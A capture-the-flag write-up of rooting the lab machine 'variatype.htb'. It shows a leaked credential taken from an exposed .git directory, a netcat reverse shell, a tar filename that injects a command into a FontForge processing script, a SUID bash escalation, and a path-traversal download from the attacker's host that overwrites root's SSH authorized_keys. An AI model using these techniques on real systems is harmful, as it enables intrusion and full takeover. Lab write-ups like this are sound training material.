#### info enum
port 22,and 80 open

on http://variatype.htb/tools/variable-font-generator, a potential vuln with it
https://github.com/fonttools/fonttools/security/advisories/GHSA-768j-98cg-p3fv, fail to perform RCE.

http://portal.variatype.htb/ ,it is a login page. cannot make the RCE successfully.

try to fuzz the subdomains
`└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://variatype.htb/ -H 'HOST: FUZZ.variatype.htb' -t 100 -fw 5`
```
portal                  [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 2355ms]
```
add to hosts file.

`sudo dirsearch -u http://portal.variatype.htb/ `
```
[17:45:27] Starting: 
[17:45:34] 301 -  169B  - /.git  ->  http://portal.variatype.htb/.git/
[17:45:34] 403 -  555B  - /.git/branches/
[17:45:34] 403 -  555B  - /.git/
[17:45:34] 200 -   39B  - /.git/COMMIT_EDITMSG
[17:45:34] 200 -  143B  - /.git/config
[17:45:34] 200 -   23B  - /.git/HEAD
[17:45:34] 200 -   73B  - /.git/description
[17:45:34] 403 -  555B  - /.git/hooks/
[17:45:34] 200 -  137B  - /.git/index
[17:45:34] 403 -  555B  - /.git/info/
[17:45:34] 200 -  240B  - /.git/info/exclude
[17:45:34] 403 -  555B  - /.git/logs/
[17:45:34] 200 -  700B  - /.git/logs/HEAD
[17:45:34] 301 -  169B  - /.git/logs/refs  ->  http://portal.variatype.htb/.git/logs/refs/
[17:45:34] 301 -  169B  - /.git/logs/refs/heads  ->  http://portal.variatype.htb/.git/logs/refs/heads/
[17:45:34] 200 -  700B  - /.git/logs/refs/heads/master
[17:45:34] 403 -  555B  - /.git/objects/
[17:45:34] 301 -  169B  - /.git/refs/heads  ->  http://portal.variatype.htb/.git/refs/heads/
[17:45:34] 200 -   41B  - /.git/refs/heads/master
[17:46:27] 301 -  169B  - /files  ->  http://portal.variatype.htb/files/
[17:46:27] 403 -  555B  - /files/
[17:47:20] 302 -    0B  - /view.php  ->  /
```
As .git folders we can see, dump the git info
`└─$ ./gitdumper.sh http://portal.variatype.htb/.git/ dest-dir /tmp/test`
````
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########

[*] Destination folder does not exist
[+] Creating dest-dir/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/75/3b5f5957f2020480a19bf29a0ebc80267a4a3d
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/50/30e791b764cb2a50fcb3e2279fea9737444870
[+] Downloaded: objects/6f/021da6be7086f2595befaa025a83d1de99478b
[+] Downloaded: objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4
[+] Downloaded: objects/03/0e929d424a937e9bd079794a7e1aaf366bcfaf
[+] Downloaded: objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8
[+] Downloaded: objects/61/5e621dce970c2c1c16d2a1e26c12658e3669b3
```
enter .git folder, view the commits.
`└─$ git log -p `
```                                  
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];

commit 5030e791b764cb2a50fcb3e2279fea9737444870
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:57:57 2025 -0500

    feat: initial portal implementation

diff --git a/auth.php b/auth.php
new file mode 100644
index 0000000..615e621
--- /dev/null
+++ b/auth.php
@@ -0,0 +1,3 @@
+<?php
+session_start();
+$USERS = [];
```
Got a credetnial, which can be used to login the index login page, which is a page to view the upload. 

Find a poc on github, run the poc can execute command directly. It is based on the vuln below.
Set a nc listener to get www-data shell
```
listening on [any] 8821 ...
connect to [10.10.16.5] from (UNKNOWN) [10.129.114.169] 51262
which python3
/usr/bin/python3
python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@variatype:~/portal.variatype.htb/public/files$ 
```
linpeas, got nothing useful. try pspy64 to monitor the processes
`www-data@variatype:/tmp$ ./pspy64`
```
2026/03/17 04:22:01 CMD: UID=1000  PID=29713  | /bin/bash /home/steve/bin/process_client_submissions.sh 
2026/03/17 04:22:01 CMD: UID=1000  PID=29714  | /bin/bash /home/steve/bin/process_client_submissions.sh 
2026/03/17 04:22:01 CMD: UID=1000  PID=29715  | /bin/bash /home/steve/bin/process_client_submissions.sh 
2026/03/17 04:22:01 CMD: UID=1000  PID=29716  | 
2026/03/17 04:22:01 CMD: UID=1000  PID=29717  | /bin/bash /home/steve/bin/process_client_submissions.sh 
2026/03/17 04:22:01 CMD: UID=1000  PID=29718  | /usr/local/src/fontforge/build/bin/fontforge -lang=py -c 
import fontforge
import sys
try:
    font = fontforge.open('variabype_KuqJ507W4JA.ttf')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process variabype_KuqJ507W4JA.ttf: {e}', file=sys.stderr)
    sys.exit(1)
```
a bash is routinely executed.
`www-data@variatype:/tmp$ find / -name *submissions* 2>/dev/null`
```
find / -name *submissions* 2>/dev/null
/opt/process_client_submissions.bak
```

`www-data@variatype:/opt$ cat process_client_submissions.bak`
```
#!/bin/bash
#
# Variatype Font Processing Pipeline
# Author: Steve Rodriguez <steve@variatype.htb>
# Only accepts filenames with letters, digits, dots, hyphens, and underscores.
#

set -euo pipefail

UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"
PROCESSED_DIR="/home/steve/processed_fonts"
QUARANTINE_DIR="/home/steve/quarantine"
LOG_FILE="/home/steve/logs/font_pipeline.log"

mkdir -p "$PROCESSED_DIR" "$QUARANTINE_DIR" "$(dirname "$LOG_FILE")"

log() {
    echo "[$(date --iso-8601=seconds)] $*" >> "$LOG_FILE"
}

cd "$UPLOAD_DIR" || { log "ERROR: Failed to enter upload directory"; exit 1; }

shopt -s nullglob

EXTENSIONS=(
    "*.ttf" "*.otf" "*.woff" "*.woff2"
    "*.zip" "*.tar" "*.tar.gz"
    "*.sfd"
)

SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'

found_any=0
for ext in "${EXTENSIONS[@]}"; do
    for file in $ext; do
        found_any=1
        [[ -f "$file" ]] || continue
        [[ -s "$file" ]] || { log "SKIP (empty): $file"; continue; }

        # Enforce strict naming policy
        if [[ ! "$file" =~ $SAFE_NAME_REGEX ]]; then
            log "QUARANTINE: Filename contains invalid characters: $file"
            mv "$file" "$QUARANTINE_DIR/" 2>/dev/null || true
            continue
        fi

        log "Processing submission: $file"

        if timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
import fontforge
import sys
try:
    font = fontforge.open('$file')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process $file: {e}', file=sys.stderr)
    sys.exit(1)
"; then
            log "SUCCESS: Validated $file"
        else
            log "WARNING: FontForge reported issues with $file"
        fi

        mv "$file" "$PROCESSED_DIR/" 2>/dev/null || log "WARNING: Could not move $file"
    done
done
```

for fontforge. a vuln to inject command
https://www.canva.dev/blog/engineering/fonts-are-still-a-helvetica-of-a-problem/
```
touch archive.zip\;id\;.zip

fontforge -lang=ff -c 'Open($1);' archive.zip\;id\;.zip /tmp/zip.ttf

Copyright (c) 2000-2024. See AUTHORS for Contributors.
# [SNIP]
sh: 1: unzip: not found
uid=0(root) gid=0(root) groups=0(root)
sh: 1: .zip: not found
```
the payload is:
```
#!/usr/bin/env python3
import tarfile
import os

exec_command = f"$(touch /tmp/poc)"

with tarfile.open("poc.tar", "w", format=tarfile.USTAR_FORMAT) as t:
    t.addfile(tarfile.TarInfo(exec_command))
```
create the compessed file
`python3 addtar.py`

cp poc.tar /var/www/portal.variatype.htb/public/files/

wait the bash ran by steve privi to process the pyaload, we get a bash owned by steve created.

`www-data@variatype:/tmp$ ./bash -p`
```
./bash -p
bash-5.2$ id
id
uid=33(www-data) gid=33(www-data) euid=1000(steve) egid=1000(steve) groups=1000(steve),33(www-data)
```
#### control pesistance
`└─$ ssh -i id_rsa steve@variatype.htb      `
```                 
Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Mar 17 05:18:02 2026 from 10.10.16.5
steve@variatype:~$ 
```
`steve@variatype:~$ sudo -l`
```
Matching Defaults entries for steve on variatype:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```
```
steve@variatype:~$ ls -la /opt/font-tools/install_validator.py
-rw-r--r-- 1 root root 2344 Dec 11 18:03 /opt/font-tools/install_validator.py
```

this install_validator script install the file from remote addr, and does not check the file name. It could be manulated the path.
on attack machine:
```
─$ sudo mkdir root 
cd root
└─$ mkdir .ssh 

└─$ cp id_rsa.pub root/.ssh/authorized_keys
```
on target machine, use paylaod to overwrite root authorized _keys
```
steve@variatype:~$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://10.10.16.5/%2froot%2f.ssh%2fauthorized_keys'
2026-03-17 05:35:48,112 [INFO] Attempting to install plugin from: http://10.10.16.5/%2froot%2f.ssh%2fauthorized_keys
2026-03-17 05:35:48,118 [INFO] Downloading http://10.10.16.5/%2froot%2f.ssh%2fauthorized_keys
2026-03-17 05:35:48,886 [INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```
login as 
└─$ ssh -i id_rsa root@variatype.htb          
Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64
```
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Mar 17 05:36:21 2026 from 10.10.16.5
root@variatype:~# id
uid=0(root) gid=0(root) groups=0(root)
```
